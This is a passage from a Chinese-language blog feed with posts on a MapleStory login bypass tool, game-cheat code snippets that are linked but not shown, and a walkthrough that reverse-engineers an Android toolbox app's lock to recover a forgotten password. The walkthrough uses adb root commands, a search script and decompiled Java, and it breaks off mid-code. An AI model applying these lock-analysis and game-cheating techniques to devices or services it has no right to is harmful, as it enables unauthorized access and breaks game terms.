&lt;p&gt;Source: &lt;a href="https://gist.github.com/Inndy/d9d1d37221a3a99a3c71"&gt;https://gist.github.com/Inndy/d9d1d37221a3a99a3c71&lt;/a&gt;
&lt;script src="https://gist.github.com/Inndy/d9d1d37221a3a99a3c71.js"&gt;&lt;/script&gt;&lt;/p&gt;</content></entry><entry><title>新楓之谷免開網頁登入器</title><link href="https://blog.inndy.tw/2014/02/04/new-maplestory-login-without-fucking-beanfun/" rel="alternate"></link><published>2014-02-04T13:53:00+08:00</published><updated>2014-02-04T13:53:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2014-02-04:/2014/02/04/new-maplestory-login-without-fucking-beanfun/</id><summary type="html">&lt;p&gt;&lt;img alt="screenshot" src="/images/2014-02-04-new-maplestory-login-without-fucking-beanfun--70ae294b--01.png"&gt;
&lt;img alt="screenshot" src="/images/2014-02-04-new-maplestory-login-without-fucking-beanfun--26873292--02.png"&gt;&lt;/p&gt;
&lt;p&gt;下載：&lt;a href="https://docs.google.com/file/d/0BwCCAN51pvN5RzNkNWxua2kwWlU/edit"&gt;https://docs.google.com/file/d/0BwCCAN51pvN5RzNkNWxua2kwWlU/edit&lt;/a&gt;
原始碼：&lt;a href="https://github.com/Inndy/NewBeanfunLogin4TWMS"&gt;GitHub&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="screenshot" src="/images/2014-02-04-new-maplestory-login-without-fucking-beanfun--70ae294b--01.png"&gt;
&lt;img alt="screenshot" src="/images/2014-02-04-new-maplestory-login-without-fucking-beanfun--26873292--02.png"&gt;&lt;/p&gt;
&lt;p&gt;下載：&lt;a href="https://docs.google.com/file/d/0BwCCAN51pvN5RzNkNWxua2kwWlU/edit"&gt;https://docs.google.com/file/d/0BwCCAN51pvN5RzNkNWxua2kwWlU/edit&lt;/a&gt;
原始碼：&lt;a href="https://github.com/Inndy/NewBeanfunLogin4TWMS"&gt;GitHub&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>【C / C++】Windows 遊戲外掛實用的一些 Code 片段</title><link href="https://blog.inndy.tw/2014/02/03/c-cpp-windows-game-hack-source/" rel="alternate"></link><published>2014-02-03T15:11:00+08:00</published><updated>2014-02-03T15:11:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2014-02-03:/2014/02/03/c-cpp-windows-game-hack-source/</id><summary type="html">&lt;p&gt;在楓之谷外掛圈打混一段時間，已經覺得乏味了
提供一點寫外掛時用的上的Code片段...
我使用的 IDE 是 Borland C++ Builder / Embarcadero C++ Builder
在Visual Studio下應該也能正常運作
這裡面採用的都是 Intel ASM Style&lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/Inndy/e82499caba9b0649a963"&gt;https://gist.github.com/Inndy/e82499caba9b0649a963&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;在楓之谷外掛圈打混一段時間，已經覺得乏味了
提供一點寫外掛時用的上的Code片段...
我使用的 IDE 是 Borland C++ Builder / Embarcadero C++ Builder
在Visual Studio下應該也能正常運作
這裡面採用的都是 Intel ASM Style&lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/Inndy/e82499caba9b0649a963"&gt;https://gist.github.com/Inndy/e82499caba9b0649a963&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>APK逆向經驗：取回正點工具箱程式鎖密碼</title><link href="https://blog.inndy.tw/2014/02/02/apk-reverse-engineering-get-back-zdbox-applock-password/" rel="alternate"></link><published>2014-02-02T07:12:00+08:00</published><updated>2014-02-02T07:12:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2014-02-02:/2014/02/02/apk-reverse-engineering-get-back-zdbox-applock-password/</id><summary type="html">&lt;h3&gt;過程中使用到的工具：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;ul&gt;
&lt;li&gt;因為我要從幾百個檔案中，找出其中一個包含有指定字串的檔案...&lt;a href="http://python.org/"&gt;http://python.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;~~這樣真的很蠢，請愛用 &lt;code&gt;find&lt;/code&gt; &lt;code&gt;grep&lt;/code&gt;~~ (thanks to Orange)&lt;/li&gt;
&lt;li&gt;onekey-decompile-apk&lt;ul&gt;
&lt;li&gt;APK拖進去就給你Java Code&lt;a href="http://code.google.com/p/onekey-decompile-apk/"&gt;http://code.google.com/p/onekey-decompile-apk/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;APK multi-tool&lt;ul&gt;
&lt;li&gt;我用的是 apk.tw 上，繁體中文化的版本這東西可以解出smali和resource，而且可以打包回APK &lt;a href="https://github.com/APK-Multi-Tool/APK-Multi-Tool"&gt;https://github.com/APK-Multi-Tool/APK-Multi-Tool&lt;/a&gt; &lt;a href="http://apk.tw/thread-217838-1-1.html"&gt;http://apk.tw/thread-217838-1-1.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Notepad++&lt;ul&gt;
&lt;li&gt;Windows下超讚的文字編輯器，因為APK multi-tool linux版好像怪怪的，只好用Windows &lt;a href="http://notepad-plus-plus.org/"&gt;http://notepad-plus-plus.org …&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h3&gt;過程中使用到的工具：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;ul&gt;
&lt;li&gt;因為我要從幾百個檔案中，找出其中一個包含有指定字串的檔案...&lt;a href="http://python.org/"&gt;http://python.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;~~這樣真的很蠢，請愛用 &lt;code&gt;find&lt;/code&gt; &lt;code&gt;grep&lt;/code&gt;~~ (thanks to Orange)&lt;/li&gt;
&lt;li&gt;onekey-decompile-apk&lt;ul&gt;
&lt;li&gt;APK拖進去就給你Java Code&lt;a href="http://code.google.com/p/onekey-decompile-apk/"&gt;http://code.google.com/p/onekey-decompile-apk/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;APK multi-tool&lt;ul&gt;
&lt;li&gt;我用的是 apk.tw 上，繁體中文化的版本這東西可以解出smali和resource，而且可以打包回APK &lt;a href="https://github.com/APK-Multi-Tool/APK-Multi-Tool"&gt;https://github.com/APK-Multi-Tool/APK-Multi-Tool&lt;/a&gt; &lt;a href="http://apk.tw/thread-217838-1-1.html"&gt;http://apk.tw/thread-217838-1-1.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Notepad++&lt;ul&gt;
&lt;li&gt;Windows下超讚的文字編輯器，因為APK multi-tool linux版好像怪怪的，只好用Windows &lt;a href="http://notepad-plus-plus.org/"&gt;http://notepad-plus-plus.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;一支 Root 過的手機&lt;ul&gt;
&lt;li&gt;其實可以用模擬器替代啦...&lt;/li&gt;
&lt;li&gt;&lt;a href="http://api.sonymobile.com/files/xperia-sl-hero-black-1240x840-846460e0dc616cc64025fc40df13a6db.jpg"&gt;&lt;img alt="xperia-sl-hero-black-1240x840-846460e0dc616cc64025fc40df13a6db.jpg" src="/images/2014-02-02-apk-reverse-engineering-get-back-zdbox-applock-password--f813d177--xperia-sl-hero-black-1240x840-846460e0dc616cc64025fc40df13a6db.jpg"&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;adb&lt;ul&gt;
&lt;li&gt;&lt;a href="http://developer.android.com/tools/help/adb.html"&gt;http://developer.android.com/tools/help/adb.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more--&gt;

&lt;h3&gt;第一步：把apk抓出來&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  Microsoft Windows [版本 6.1.7601]
  Copyright (c) 2009 Microsoft Corporation. All rights reserved.

  C:\Users\Inndy&amp;gt;adb shell
  shell@android:/ $ su
  su
  root@android:/ # cd data/app
  cd data/app
  root@android:/data/app # ls | busybox grep -e &amp;#39;zd&amp;#39;
  ls | busybox grep -e &amp;#39;zd&amp;#39;
  com.zdworks.android.toolbox-1.apk
  root@android:/data/app # exit
  exit
  shell@android:/ $ exit
  exit

  C:\Users\Inndy&amp;gt;adb pull /data/app/com.zdworks.android.toolbox-1.apk
  2875 KB/s (6326169 bytes in 2.148s)

  C:\Users\Inndy&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;第二步：分別丟進兩種工具反編譯&lt;/h3&gt;
&lt;h3&gt;第三步：找出關鍵字串和參考點&lt;/h3&gt;
&lt;p&gt;從 APK multi-tool 解出來的東西裡面找，String Resource在 res\values-zh-rTW\strings.xml 裡面，搜尋 "密碼錯誤" 後找到...&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Line 309: &amp;lt;string name="input_fail"&amp;gt;密碼錯誤請重新輸入!&amp;lt;/string&amp;gt;"&lt;/code&gt;
然後我寫了一個Python Script去找含有 "input_fail" 的檔案，藉此挖出Resource ID&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dirs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;walk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./smali&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;realpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input_fail&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input_fail&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Line &lt;/span&gt;&lt;span class="si"&gt;%5d&lt;/span&gt;&lt;span class="s2"&gt;:&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;=== Result ===&lt;/span&gt;

&lt;span class="sd"&gt;C:\Users\Inndy\Desktop\APK Multi-Tool V1.0.11\projects\zdbox.apk\smali\com\zdworks\android\toolbox\R$string.smali&lt;/span&gt;
&lt;span class="sd"&gt;Line  1966:.field public static final input_fail:I = 0x7f090342&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接著在onekey-decompile-apk解出來的source裡面尋找檔名：applock
會找到很多檔案，全部丟進Notepad++打開
搜索所有檔案 -&amp;gt; "2131297090"  (2131297090 = 0x7f090342)
接著找到了...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="nt"&gt;C&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Inndy&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Desktop&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;zdbox&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;apk&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;src&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;com&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;zdworks&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;android&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;toolbox&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;ui&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;applock&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;AppLockPasswordActivity&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;java&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;hit&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;span class="nt"&gt;Line&lt;/span&gt; &lt;span class="nt"&gt;109&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;       &lt;span class="nt"&gt;Toast&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;makeText&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;this&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;2131297090&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;show&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
  &lt;span class="nt"&gt;C&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Inndy&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;Desktop&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;zdbox&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;apk&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;src&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;com&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;zdworks&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;android&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;toolbox&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;ui&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;applock&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;java&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;hit&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;span class="nt"&gt;Line&lt;/span&gt; &lt;span class="nt"&gt;348&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;           &lt;span class="nt"&gt;Toast&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;makeText&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;this&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;2131297090&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;show&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接下來就是Code Review找來源&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// com\zdworks\android\toolbox\ui\applock\AppLockPasswordActivity.java&lt;/span&gt;
&lt;span class="c1"&gt;// Line 340&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;onPatternDetected&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;LockPatternView&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Cell&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;paramList&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PasswordUtils&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;patternToString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;paramList&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;mHandler&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;postDelayed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;AutoClearThread&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1000L&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;crtPattern&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((!&lt;/span&gt;&lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;checkpattern&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;calledIntent&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;calledIntent&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
 &lt;span class="o"&gt;{&lt;/span&gt;
   &lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setPatternState&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
   &lt;span class="n"&gt;Toast&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;makeText&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2131297090&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;show&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
   &lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;initTitle&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
 &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="o"&gt;{&lt;/span&gt;
 &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
 &lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setPatternState&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
 &lt;span class="n"&gt;ApplockPatternActivity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;finishInputPassword&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
 &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;crtPattern&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// com\zdworks\android\toolbox\ui\applock\ApplockPatternActivity.java&lt;/span&gt;
&lt;span class="c1"&gt;// Line 199&lt;/span&gt;
